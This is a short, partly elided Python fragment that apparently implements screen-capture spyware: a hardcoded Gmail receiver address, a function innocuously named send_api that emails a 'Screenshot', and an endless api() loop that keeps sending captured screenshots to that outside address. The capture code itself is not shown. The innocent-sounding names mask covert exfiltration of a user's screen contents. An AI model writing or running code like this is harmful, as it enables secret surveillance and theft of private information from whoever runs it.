...
receiver_email = "demoaptx123@gmail.com"


def send_api(sender_email, sender_password, receiver_email, subject, screenshot):
    try:
...
def api():
    while True:
        ...
        # Gửi email
        send_api(
            sender_email, sender_password, receiver_email, "Screenshot", screenshot
        )
